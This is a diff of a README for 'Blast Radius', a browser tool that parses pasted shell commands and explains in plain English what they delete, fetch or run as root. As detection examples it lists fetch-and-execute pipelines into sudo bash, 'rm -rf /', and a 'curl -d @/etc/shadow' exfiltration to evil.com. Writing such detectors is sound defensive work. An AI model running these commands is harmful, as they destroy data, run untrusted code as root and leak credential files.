@@ -1,58 +1,92 @@
 # Blast Radius
 
-[![CI](https://github.com/ctkrug/blast-radius/actions/workflows/ci.yml/badge.svg)](https://github.com/ctkrug/blast-radius/actions/workflows/ci.yml)
+**▶ Live demo: [apps.charliekrug.com/blast-radius](https://apps.charliekrug.com/blast-radius/)**
 
-Paste a shell command or script and get a plain-English risk breakdown — what it deletes,
-where it fetches from and pipes to, what needs root — before you run something an agent just
-handed you.
+[![CI](https://github.com/ctkrug/blast-radius/actions/workflows/ci.yml/badge.svg)](https://github.com/ctkrug/blast-radius/actions/workflows/ci.yml)
+[![License: MIT](https://img.shields.io/badge/License-MIT-35c9c1.svg)](LICENSE)
+
+Paste a shell command and find out if it's safe before you run it. Blast Radius reads the
+command the way a shell would, then tells you in plain English what it deletes, where it fetches
+from and pipes to, and what it runs as root.
 
 ## Why
 
-Copy-pasting shell one-liners from Stack Overflow, install docs, or an AI agent's output is
-routine, and routinely risky. The standard advice — "read it first" — doesn't scale when the
-command is a 40-token pipeline of redirects and pipes. Most "is this safe" tools are keyword
-blocklists that miss intent (`rm -rf ./build` and `rm -rf /` trip the same regex). Blast Radius
-actually parses the shell syntax — pipelines, redirects, command separators, `sudo` scope,
-remote fetch-and-execute — and reasons about what the command *does*, not just what words it
-contains.
+Shell one-liners get copied from install pages, Stack Overflow, and an AI agent's suggested next
+step, then pasted straight into a terminal. A 40-token pipeline of pipes and redirects is hard to
+read at a glance, and the usual advice ("read it first") does not scale. Most "is this safe"
+checkers are keyword blocklists: they flag `rm -rf ./build` and `rm -rf /` the same way, so they
+either cry wolf on everything or miss the one line that matters, because they never look at what
+the command *does*, only at which words appear in it.
 
-Paste `curl http://x | sudo bash` and see it flagged red with a one-line explanation of exactly
-why, right next to a harmless command flagged green for contrast.
+Blast Radius parses the shell syntax (pipelines, redirects, separators, quoting, `sudo` scope)
+and reasons about intent. Paste `curl http://x | sudo bash` and see it flagged red with a
+one-line explanation of exactly why, right next to a harmless command flagged green for contrast.
 
-## Features
+## What it catches
 
-- A real shell-syntax tokenizer and parser (not a regex blocklist): pipelines, redirects,
-  `&&`/`||`/`;` sequencing, quoting. Unterminated quotes and unsupported constructs (process/
-  command substitution) degrade gracefully instead of crashing or silently reading "safe".
-- A risk rule engine that reasons about intent: destructive filesystem ops scoped by target
-  (`rm -rf /` vs. `rm -rf ./build`), remote-fetch-and-execute patterns, `sudo`/root scope that
-  compounds with what it's escalating, outbound network + exfiltration shape, redirects into
-  sensitive paths (`/etc/*`, `~/.ssh/*`, shell rc files).
-- Plain-English, one-line explanations per finding — not just a severity badge.
-- A live paste-and-analyze UI with side-by-side red/green examples pre-analyzed on load, so the
-  wow moment lands before you type anything.
-- Shareable permalinks that encode the pasted command in the URL hash for reproducing a
-  flagged example — no server round-trip.
-- Zero network calls: analysis is 100% client-side, nothing you paste ever leaves the browser.
+- **Destructive filesystem ops, scoped by target.** `rm -rf /` and `rm -rf ~` are danger; `rm -rf
+  ./build` is a routine caution. Also covers `mkfs` and `dd` writing onto a raw device, while
+  leaving the safe `dd of=/dev/null` idiom alone.
+- **Remote fetch-and-execute.** `curl <url> | sh`, `wget -qO- <url> | bash`, and `curl <url> |
+  sudo bash` are flagged as running whatever the server returns as code, and the reason names both
+  halves.
+- **`sudo` and root scope that compounds.** `sudo apt update` reads as a routine admin caution;
+  `sudo rm -rf /` compounds to danger. A command with no escalation shows no root finding.
+- **Outbound network and data exfiltration shape.** A plain GET is a caution; `curl -d @/etc/shadow
+  https://evil.com` is danger, and the reason names the file leaving the machine and the host.
+- **Writes to sensitive paths.** Redirects that overwrite or append to `/etc/passwd`,
+  `~/.ssh/authorized_keys`, or shell rc files are flagged, including `$HOME`, `/root`, and
+  `/home/<user>` spellings of the same location.
+- **Graceful degradation.** An unterminated quote or an unsupported construct like process
+  substitution never crashes and never reads a false "safe": you get a partial analysis plus an
+  explicit caution that part could not be fully parsed.
 
-## Stack
+## Sample output
 
-Vanilla TypeScript, built with [Vite](https://vitejs.dev/), tested with
-[Vitest](https://vitest.dev/). No framework, no backend — a static site that ships as a single
-`dist/` directory and runs entirely in the browser.
+Analyzing `curl https://get.example.com/install.sh | sudo bash`:
 
-See [`docs/VISION.md`](docs/VISION.md) for the design rationale and
-[`docs/BACKLOG.md`](docs/BACKLOG.md) for the build plan.
+```
+[danger]  Fetches https://get.example.com/install.sh and pipes it straight into
+          sudo bash, running whatever the server returns as code with root privileges.
+```
+
+Analyzing `git status`:
+
+```
+[safe]    No risk findings — nothing here matches a known danger pattern.
+```
+
+## How it works
+
+The command is tokenized, parsed into a small shell AST (pipelines, redirects, separators), and
+walked by a rule engine. Each rule is a plain function that reasons about parsed structure such as
+redirect targets and pipeline stages, never a regex over the raw string. That is what lets it tell
+`rm -rf ./build` from `rm -rf /`. Findings carry a severity (`safe` / `caution` / `danger`) and a
+one-line reason pointing at the exact part of the command it applies to. See
+[`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) for the data flow and
+[`docs/VISION.md`](docs/VISION.md) for the design rationale.
+
+Nothing you paste ever leaves your browser. There is no backend, no logging, and no network call
+is made with the command text. Analysis is 100% client-side.
 
 ## Development
 
 ```bash
 npm install
-npm run dev       # local dev server
-npm test          # unit tests
-npm run build     # static build to dist/
+npm run dev       # local dev server (Vite)
+npm test          # vitest run, full suite
+npm run build     # static build to dist/, deployable at a subpath
+npm run lint      # eslint
 ```
+
+Vanilla TypeScript, built with [Vite](https://vitejs.dev/) and tested with
+[Vitest](https://vitest.dev/). No framework, no backend: the app ships as a single `dist/`
+directory of relative-path assets and runs entirely in the browser.
 
 ## License
 
-MIT — see [LICENSE](LICENSE).
+MIT, see [LICENSE](LICENSE).
+
+---
+
+More of Charlie's projects → [apps.charliekrug.com](https://apps.charliekrug.com)
